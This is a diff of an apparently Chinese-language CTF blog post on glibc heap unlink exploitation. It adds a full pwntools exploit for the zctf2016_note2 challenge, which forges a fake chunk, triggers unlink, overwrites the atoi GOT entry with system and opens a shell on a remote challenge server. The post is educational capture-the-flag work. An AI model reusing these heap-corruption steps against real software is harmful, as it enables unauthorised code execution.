@@ -35,6 +35,10 @@ excerpt: unlink
 
 unlink漏洞同时向两个地址进行了写入，所以在保证targe taddr -12 可以写入的同时，也要保证expect value + 8 有写入权限
 
+#### 上面这些都没用
+
+![](/img/unlink/1.jpg)
+
 #### 加入检查机制之后
 
 ```C
@@ -61,19 +65,106 @@ BK->fd = FD;
 
 
 
+### zctf2016_note2
+
+**需要注意的是unlink的fakechunk大小不能小于max fastbin，因为fastbin里的根本没有把下一个inuse bit置零，也就不会存在unlink**
+
+使用了one gadget，还有覆盖atoi的got表都成功了，但是覆盖free的got表，再delete(2)却不能成功，不知道原因
+
+```python
+from pwn import *
+from LibcSearcher import *
+context(arch='amd64', os='linux')
+#p = process("./note2")
+e = ELF("./note2")
+p = remote("node4.buuoj.cn", 25956)
+#gdb.attach(p)
+
+def new(size, content):
+    p.recvuntil(b">>")
+    p.sendline(b"1")
+    p.recvuntil(b")")
+    p.sendline(str(size).encode())
+    p.recvuntil(b":")
+    p.sendline(content)
+
+def show(index):
+    p.recvuntil(b">>")
+    p.sendline(b"2")
+    p.recvuntil(b":")
+    p.sendline(str(index).encode())
+
+def edit(index, choice, content):
+    p.recvuntil(b">>")
+    p.sendline(b"3")
+    p.recvuntil(b":")
+    p.sendline(str(index).encode())
+    p.recvuntil("]")
+    p.sendline(str(choice).encode())
+    p.recvuntil(":")
+    p.sendline(content)
+
+def delete(index):
+    p.recvuntil(b">>")
+    p.sendline(b"4")
+    p.recvuntil(b":")
+    p.sendline(str(index).encode())
+
+p.recvuntil(b":")
+p.sendline(b"abc") # name
+p.recvuntil(b":")
+p.sendline(b"def") # addr
+
+ptr = 0x602120
+fd = ptr - 0x18
+bk = ptr - 0x10
+
+new(0x80, p64(0) + p64(0xa1) + p64(fd) + p64(bk) )
+new(0x0,  b'\x01' * 0x10)  
+new(0x80, b'/bin/sh\x00') 
+
+delete(1)
+new(0x0, b'\0' * 16 + p64(0xa0) + p64(0x90))  # overflow 
+
+delete(2) # unlink
+
+free_got = e.got["free"]
+atoi_got = e.got['atoi']
+edit(0, 1, b'\x03' * 0x18 + p64(atoi_got))
+show(0)
+p.recvuntil(b"Content is ")
+
+atoi = u64(p.recvuntil(b"\n")[:-1].ljust(8,b'\x00'))
+log.info("atoi :" + str(hex(atoi)))
 
 
-### 题目链接
+# # local 
+#libc = ELF("./glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6")
+#libc.address =  atoi - libc.sym['atoi']
+#system = libc.sym["system"]
+#log.info("system :" + str(hex(system)))
+# one_gadget :
+#system = libc.address + 0xef9f4 
+
+# remote
+libc = LibcSearcher("atoi", atoi)
+offset = atoi - libc.dump('atoi')
+system = offset + libc.dump('system')
+
+edit(0, 1 , p64(system))
+
+p.interactive() # input /bin/sh
+```
+
+
+
+### ZJCTF2019 EasyHeap
 
 <https://buuoj.cn/challenges#[ZJCTF%202019]EasyHeap>
-
-#### 漏洞
 
 很明显在`ceate_heap`中size并没有存下来，然后`edit_heap`时也是用户自己输入size来编辑
 
 因此可以溢出
-
-#### 利用
 
 checksec发现没有开启PIE，heaparray的地址可以直接使用
 
